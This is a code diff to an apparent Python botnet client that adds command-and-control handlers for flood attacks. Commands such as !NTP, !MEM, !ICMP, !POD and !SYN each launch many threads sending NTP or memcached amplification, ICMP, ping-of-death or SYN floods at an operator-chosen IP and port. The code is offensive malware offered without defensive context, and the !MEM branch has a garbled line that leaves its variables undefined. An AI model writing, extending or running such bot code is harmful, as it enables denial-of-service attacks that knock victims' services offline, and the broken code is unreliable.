@@ -234,8 +234,39 @@ def handle_c2_connection(c2):
                     threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                     threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                     threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
-            
-            elif command == 'PING':
+             elif command == '!NTP':
+                ip = args[1]
+                port = int(args[2])
+                timer = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()
+            elif command == '!MEM':
+                ip = args[1]
+                porttimer = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()
+            elif command == '!ICMP':
+                ip = args[1]
+                timer = time.time() + int(args[2])
+                threads = int(args[3])
+                for _ in range(threads):
+                    threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()
+            elif command == '!POD':
+                ip = args[1]
+                timer = time.time() + int(args[2])
+                threads = int(args[3])
+                for _ in range(threads):
+                    threading.Thread(target=pod, args=(ip, timer), daemon=True).start()
+            elif command == '!SYN':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=attack_SYN, args=(ip, port, secs), daemon=True).start()
+            elif command == '!PING':
                 c2.send('PONG'.encode())
     except:
         c2.close()
